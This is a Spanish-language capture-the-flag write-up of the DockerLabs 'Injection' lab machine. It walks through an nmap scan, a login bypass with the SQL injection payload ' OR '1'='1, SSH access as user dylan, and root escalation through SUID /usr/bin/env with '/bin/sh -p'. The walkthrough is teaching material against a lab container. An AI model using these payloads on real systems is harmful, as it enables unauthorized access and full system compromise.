---
title: Injection - DockerLabs
categories: [ Linux ]
tags: [DockerLabs]
---

<img src="/assets/img/DLabs/injection.png" alt="Captura de pantalla de la máquina Injection en DockerLabs">

Hoy trataremos de explotar la máquina *Injection* de [DockerLabs](https://dockerlabs.es/), de dificultad Muy Fácil. Vamos a utilizar un payload de inyección SQL para evadir la autenticación del login.

## Desplegamos la máquina

```bash
➤ sudo bash auto_deploy.sh injection.tar
[sudo] contraseña para nmc:     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla

```



## Escaneo NMAP
Antes que nada, deberemos hacer un escaneo de puertos con **nmap** para encontrar los puertos abiertos y qué servicios corren en ellos.

```bash
➤ nmap -sV -p- --min-rate=100 -T4 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-17 22:36 CST
Nmap scan report for 172.17.0.2
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds
```



Nos percatamos de que está abierto el puerto 22 con el servicio SSH y el puerto 80 con el servicio HTTP. Entramos a la web con el puerto 80: <mark>http://172.17.0.2:80</mark> y nos carga un formulario de login.

<img src="/assets/img/DLabs/login-injection.png" alt="Captura de pantalla del login de la máquina Injection en DockerLabs">

## Payload

Intentamos entrar con las siguientes credenciales:
User:<mark>' OR '1'='1</mark>
Password:<mark>' OR '1'='1</mark>

<img src="/assets/img/DLabs/credentials-injection.png" alt="Captura de pantalla de las credenciales de la máquina Injection en DockerLabs">

Este payload funciona porque modifica la consulta SQL del backend para que siempre sea verdadera:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1';
```



Como <mark>'1'='1'</mark> siempre es cierto, se omite la verificación real.

## SSH 

Tras acceder al sistema, notamos que el nombre del usuario es dylan, visible en la interfaz web. Intentamos la conexión mediante SSH con esas credenciales:

```bash
➤ ssh dylan@172.17.0.2
dylan@172.17.0.2's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.8.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

dylan@1eae96493101:~$
```



## Escalada de privilegios

Buscamos archivos con el bit **SUID** activado:

```bash
dylan@1eae96493101:~$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/env
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
dylan@1eae96493101:~$ 
```



El binario <mark>/usr/bin/env</mark> tiene el bit SUID activado, lo que permite ejecutarlo con privilegios de root. Lo aprovechamos para escalar privilegios con el siguiente comando y tambien probamos *whoami*:


```bash
dylan@1eae96493101:~$ /usr/bin/env /bin/sh -p
# whoami
root
# 
```



## Acceso ROOT obtenido

¡Máquina comprometida! Te deseo un feliz hackeo.
